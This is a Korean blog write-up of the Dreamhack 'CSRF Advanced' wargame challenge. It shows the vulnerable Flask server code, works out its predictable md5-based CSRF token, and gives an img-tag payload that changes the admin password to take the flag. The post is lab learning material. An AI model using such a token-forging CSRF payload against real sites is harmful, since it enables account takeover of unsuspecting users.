---
title: (10) Dreamhack CSRF Advanced 문제 풀이
date: 2024-01-13 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
![](https://kyuyeop.github.io/assets/img/post/10/1.png)
XSS 문제에서 본 그 템플릿인데 로그인과 비밀번호 변경 기능이 생겼습니다.  
코드 입니다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from hashlib import md5
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

users = {
    'guest': 'guest',
    'admin': FLAG
}

session_storage = {}
token_storage = {}

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    service = Service(executable_path="/chromedriver")
    options = webdriver.ChromeOptions()
    try:
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/login")
        driver.add_cookie(cookie)
        driver.find_element(by=By.NAME, value="username").send_keys("admin")
        driver.find_element(by=By.NAME, value="password").send_keys(users["admin"])
        driver.find_element(by=By.NAME, value="submit").click()
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not an admin"}')


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("user not found");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(8).hex()
            session_storage[session_id] = username
            token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'


@app.route("/change_password")
def change_password():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
        csrf_token = token_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')
    pw = request.args.get("pw", None)
    if pw == None:
        return render_template('change_password.html', csrf_token=csrf_token)
    else:
        if csrf_token != request.args.get("csrftoken", ""):
            return '<script>alert("wrong csrf token");history.go(-1);</script>'
        users[username] = pw
        return '<script>alert("Done");history.go(-1);</script>'

app.run(host="0.0.0.0", port=8000)
```
먼저 vuln 페이지의 param이 소문자로 변환 후 frame script on 문자열이 검사되고 있으니, img 태그를 이용해야 할 것으로 보입니다.  

또한 csrftoken이 예측가능한 값으로 생성되고 있습니다. 즉, 해커가 얼마든지 csrftoken을 계산할 수 있다는 거죠. 아마 admin 계정의 비밀번호를 바꾸고 로그인하는게 정석이지 싶습니다.  
  
먼저 csrftoken부터 구해 봅시다. 저는 파이썬으로 서버에 있는 코드를 그대로 집어넣어 구했습니다.
```python
>>> from hashlib import md5
>>> md5(('admin127.0.0.1').encode()).hexdigest()
'7505b9c72ab4aa94b1a4ed7b207b67fb'
```
그럼 이제 admin에 대한 csrftoken을 얻었으니 flag페이지에 입력할 페이로드를 만들어 봅시다.
```html
<img src="/change_password?pw=1&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
```
img 태그로 원하는 url에 방문할 수 있도록 만들어 주었습니다.  
pw 즉, 변경할 비밀번호는 1로 하고 csrftoken에는 앞서 구한 값을 넣어주었습니다.  
  
그리고 admin/1 로 로그인해주면...
![](https://kyuyeop.github.io/assets/img/post/10/2.png)
flag를 획득할 수 있습니다.  
  
역시 어렵지 않습니다.
{% endraw %}